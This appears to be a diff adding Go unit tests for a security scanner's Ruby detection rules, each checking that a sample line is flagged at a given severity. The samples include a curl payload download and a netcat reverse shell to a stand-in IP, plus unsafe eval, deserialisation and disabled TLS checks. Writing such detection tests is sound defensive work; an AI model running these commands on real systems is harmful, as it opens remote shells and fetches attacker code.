@@ -136,6 +136,62 @@ func TestRegexScanner_DynamicImport(t *testing.T) {
 }
 
 // ---------------------------------------------------------------------------
+// RegexScanner — Ruby
+// ---------------------------------------------------------------------------
+
+func TestRegexScanner_Ruby_Eval(t *testing.T) {
+	assertRegex(t, rubyRules, "script.rb", `eval(user_input)`, 1, Critical)
+}
+
+func TestRegexScanner_Ruby_System(t *testing.T) {
+	assertRegex(t, rubyRules, "script.rb", `system("id")`, 1, Critical)
+}
+
+func TestRegexScanner_Ruby_Backtick(t *testing.T) {
+	assertRegex(t, rubyRules, "script.rb", "result = `curl http://203.0.113.1/payload`", 1, Critical)
+}
+
+func TestRegexScanner_Ruby_PercentX(t *testing.T) {
+	assertRegex(t, rubyRules, "script.rb", `output = %x{whoami}`, 1, Critical)
+}
+
+func TestRegexScanner_Ruby_IOPopen(t *testing.T) {
+	assertRegex(t, rubyRules, "script.rb", `IO.popen("nc -e /bin/sh 203.0.113.1 4444")`, 1, Critical)
+}
+
+func TestRegexScanner_Ruby_Open3(t *testing.T) {
+	assertRegex(t, rubyRules, "script.rb", `Open3.popen3("curl", c2) do |i, o, e, t|`, 1, Critical)
+}
+
+func TestRegexScanner_Ruby_MarshalLoad(t *testing.T) {
+	assertRegex(t, rubyRules, "script.rb", `obj = Marshal.load(data)`, 1, Critical)
+}
+
+func TestRegexScanner_Ruby_UnsafeYAML(t *testing.T) {
+	assertRegex(t, rubyRules, "script.rb", `cfg = YAML.load(File.read("config.yml"))`, 1, Critical)
+}
+
+func TestRegexScanner_Ruby_SafeYAMLIgnored(t *testing.T) {
+	assertRegex(t, rubyRules, "script.rb", `cfg = YAML.safe_load(File.read("config.yml"))`, 0, "")
+}
+
+func TestRegexScanner_Ruby_HardcodedSecret(t *testing.T) {
+	assertRegex(t, rubyRules, "config.rb", `api_key = "sk-realkey123456789012345678901234"`, 1, Critical)
+}
+
+func TestRegexScanner_Ruby_OpenPipe(t *testing.T) {
+	assertRegex(t, rubyRules, "script.rb", `open("| ls -la")`, 1, Warning)
+}
+
+func TestRegexScanner_Ruby_Send(t *testing.T) {
+	assertRegex(t, rubyRules, "script.rb", `obj.send(method_name, arg)`, 1, Warning)
+}
+
+func TestRegexScanner_Ruby_VerifyNone(t *testing.T) {
+	assertRegex(t, rubyRules, "client.rb", `http.verify_mode = OpenSSL::SSL::VERIFY_NONE`, 1, Warning)
+}
+
+// ---------------------------------------------------------------------------
 // RegexScanner — JavaScript
 // ---------------------------------------------------------------------------
 
